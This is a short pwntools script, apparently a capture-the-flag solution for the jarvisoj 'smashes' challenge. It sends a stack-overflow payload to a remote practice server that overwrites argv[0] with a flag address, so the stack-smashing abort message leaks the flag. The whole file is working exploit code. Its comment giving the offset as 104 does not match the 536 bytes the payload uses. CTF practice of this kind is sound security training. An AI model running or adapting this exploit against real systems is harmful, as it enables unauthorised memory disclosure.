
from pwn import *

pctf_addr_0 = 0x400d20
pctf_addr_1 = 0x600d20
# offset = 104

p = remote('pwn.jarvisoj.com', 9877)
# p = process('./smashes')
p.recvuntil('name?')

payload = 'A'*536 + p64(pctf_addr_0) + p64(0) + p64(pctf_addr_1)
p.sendline(payload)

p.recvuntil("flag: ")
env = "LIBC_FATAL_STDERR_=1"
p.sendline(env)
msg = p.recvuntil('terminated')
print msg
